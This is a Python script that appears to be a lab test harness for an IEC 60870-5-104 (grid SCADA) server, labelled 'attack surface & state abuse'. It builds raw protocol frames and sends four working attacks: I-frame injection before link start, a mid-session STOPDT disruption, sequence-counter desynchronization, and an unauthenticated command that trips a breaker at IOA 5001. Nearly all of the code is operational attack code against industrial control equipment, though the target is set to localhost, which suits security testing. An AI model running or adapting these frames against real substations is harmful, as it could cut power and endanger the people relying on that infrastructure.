import socket
import time
import sys

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 2404

# U-Format APCI Frames
STARTDT_ACT = bytes([0x68, 0x04, 0x07, 0x00, 0x00, 0x00])
STOPDT_ACT  = bytes([0x68, 0x04, 0x13, 0x00, 0x00, 0x00])
TESTFR_ACT  = bytes([0x68, 0x04, 0x43, 0x00, 0x00, 0x00])

def build_raw_i_frame(ns, nr, type_id, vsq, cot, ca, ioa, payload=bytes()):
    """Builds an I-Format frame with arbitrary N(S) and N(R) sequence numbers."""
    asdu = bytes([
        type_id,
        vsq,
        cot, 0x00,                          # COT (Cause + Originator)
        ca & 0xFF, (ca >> 8) & 0xFF,        # Common Address (2 bytes)
        ioa & 0xFF, (ioa >> 8) & 0xFF, (ioa >> 16) & 0xFF  # IOA (3 bytes)
    ]) + payload

    apci_payload_len = 4 + len(asdu)
    
    # Pack custom sequence counters (15-bit fields shifted left by 1)
    ctrl0 = (ns << 1) & 0xFE
    ctrl1 = (ns >> 7) & 0xFF
    ctrl2 = (nr << 1) & 0xFE
    ctrl3 = (nr >> 7) & 0xFF
    
    return bytes([0x68, apci_payload_len, ctrl0, ctrl1, ctrl2, ctrl3]) + asdu

def process_tcp_stream_buffer(raw_buffer):
    """Slices and displays returned APCI frames."""
    offset = 0
    buffer_len = len(raw_buffer)

    while offset < buffer_len:
        if raw_buffer[offset] != 0x68:
            offset += 1
            continue

        if offset + 2 > buffer_len:
            break

        apci_length = raw_buffer[offset + 1]
        frame_total_length = apci_length + 2

        if offset + frame_total_length > buffer_len:
            break

        frame_bytes = raw_buffer[offset : offset + frame_total_length]
        
        ctrl1 = frame_bytes[2]
        # I-Format
        if (ctrl1 & 0x01) == 0x00:
            ns = ((frame_bytes[2] | (frame_bytes[3] << 8)) >> 1)
            nr = ((frame_bytes[4] | (frame_bytes[5] << 8)) >> 1)
            type_id = frame_bytes[6] if len(frame_bytes) >= 7 else 0
            cot = frame_bytes[8] if len(frame_bytes) >= 9 else 0
            print(f"  \033[1;34m◄── RX\033[0m | \033[1mI-FRAME\033[0m | N(S):{ns:<5} N(R):{nr:<5} | Type:{type_id:<3} | COT:{cot:<2}")
        # S-Format
        elif (ctrl1 & 0x03) == 0x01:
            nr = ((frame_bytes[4] | (frame_bytes[5] << 8)) >> 1)
            print(f"  \033[1;35m◄── RX\033[0m | \033[1mS-FRAME ACK\033[0m | N(R)={nr}")
        # U-Format
        elif (ctrl1 & 0x03) == 0x03:
            print(f"  \033[1;32m◄── RX\033[0m | \033[1mU-FRAME CON/ACT\033[0m | Ctrl: 0x{ctrl1:02X}")

        offset += frame_total_length

def execute_test(test_name, test_logic):
    print(f"\n\033[1;36m=== {test_name} ===\033[0m")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2.0)
    try:
        s.connect((TARGET_HOST, TARGET_PORT))
        test_logic(s)
    except Exception as e:
        print(f"  [-] Connection error: {e}")
    finally:
        s.close()
        time.sleep(0.5)

# --- TEST 1: Uninitialized Frame Injection (Pre-STARTDT) ---
def test1_pre_startdt_injection(s):
    print("Sending I-FRAME prior to STARTDT initialization...")
    # Send Type 100 Interrogation without establishing active state
    bad_frame = build_raw_i_frame(ns=0, nr=0, type_id=100, vsq=0x01, cot=6, ca=1, ioa=0, payload=bytes([0x20]))
    print("  \033[1;32m──► TX\033[0m | I-FRAME (Uninitialized)")
    s.sendall(bad_frame)
    try:
        resp = s.recv(1024)
        if resp:
            process_tcp_stream_buffer(resp)
        else:
            print("  [*] Connection closed by server.")
    except socket.timeout:
        print("  [*] Silent Drop: No response from server.")

# --- TEST 2: Mid-Session Link State Disruption (STOPDT Injection) ---
def test2_stopdt_injection(s):
    print("1. Activating Link (STARTDT ACT)...")
    s.sendall(STARTDT_ACT)
    s.recv(1024)
    
    print("2. Injecting STOPDT ACT mid-session...")
    s.sendall(STOPDT_ACT)
    resp = s.recv(1024)
    process_tcp_stream_buffer(resp)

    print("3. Attempting I-FRAME command after STOPDT...")
    cmd_frame = build_raw_i_frame(ns=1, nr=0, type_id=45, vsq=0x01, cot=6, ca=1, ioa=5000, payload=bytes([0x01]))
    s.sendall(cmd_frame)
    try:
        resp = s.recv(1024)
        if resp:
            process_tcp_stream_buffer(resp)
        else:
            print("  [*] Connection closed / Command rejected post-STOPDT.")
    except socket.timeout:
        print("  [*] Silent Drop post-STOPDT.")

# --- TEST 3: Sequence Counter Desynchronization & Jump ---
def test3_sequence_counter_manipulation(s):
    print("1. Activating Link (STARTDT ACT)...")
    s.sendall(STARTDT_ACT)
    s.recv(1024)

    # Sub-test A: Future N(S) Jump (N(S)=5000)
    print("2. Injecting forward N(S) jump (N(S) = 5000, N(R) = 0)...")
    frame_jump = build_raw_i_frame(ns=5000, nr=0, type_id=45, vsq=0x01, cot=6, ca=1, ioa=5000, payload=bytes([0x01]))
    print("  \033[1;32m──► TX\033[0m | I-FRAME | N(S): 5000 | IOA: 5000 State: ON")
    s.sendall(frame_jump)
    try:
        resp = s.recv(1024)
        if resp:
            process_tcp_stream_buffer(resp)
    except socket.timeout:
        print("  [*] No RX (Check server log for execution).")

    # Sub-test B: Maximum Boundary N(S) = 32767
    print("3. Injecting max sequence boundary N(S) = 32767...")
    frame_max = build_raw_i_frame(ns=32767, nr=0, type_id=45, vsq=0x01, cot=6, ca=1, ioa=5000, payload=bytes([0x00]))
    print("  \033[1;32m──► TX\033[0m | I-FRAME | N(S): 32767 | IOA: 5000 State: OFF")
    s.sendall(frame_max)
    try:
        resp = s.recv(1024)
        if resp:
            process_tcp_stream_buffer(resp)
    except socket.timeout:
        print("  [*] No RX.")

# --- TEST 4: Direct Execution Control Breach (Tripping Breaker IOA 5001) ---
def test4_unauthorized_control_execution(s):
    print("1. Activating Link (STARTDT ACT)...")
    s.sendall(STARTDT_ACT)
    s.recv(1024)

    print("2. Dispatching trip command to high-impact Breaker Point (IOA: 5001, State: OFF/TRIP)...")
    breaker_trip_frame = build_raw_i_frame(ns=0, nr=0, type_id=45, vsq=0x01, cot=6, ca=1, ioa=5001, payload=bytes([0x00]))
    print("  \033[1;32m──► TX\033[0m | Single Command (Type 45) -> Target IOA: 5001 | State: OFF (TRIP)")
    s.sendall(breaker_trip_frame)
    try:
        resp = s.recv(1024)
        if resp:
            process_tcp_stream_buffer(resp)
    except socket.timeout:
        print("  [*] Sent. Checking server console output.")

def run_phase3():
    print("\033[1;31m=== IEC 104 PHASE 3: ATTACK SURFACE & STATE ABUSE ===\033[0m")
    print(f"Target: {TARGET_HOST}:{TARGET_PORT}")

    execute_test("TEST 1: Pre-STARTDT I-FRAME Injection", test1_pre_startdt_injection)
    execute_test("TEST 2: Mid-Session STOPDT Link Disruption", test2_stopdt_injection)
    execute_test("TEST 3: Sequence Counter Manipulation & Desync", test3_sequence_counter_manipulation)
    execute_test("TEST 4: Unauthorized Breaker Control Execution (IOA 5001)", test4_unauthorized_control_execution)

    print("\n\033[1;31m=== PHASE 3 TESTING COMPLETE ===\033[0m")

if __name__ == "__main__":
    run_phase3()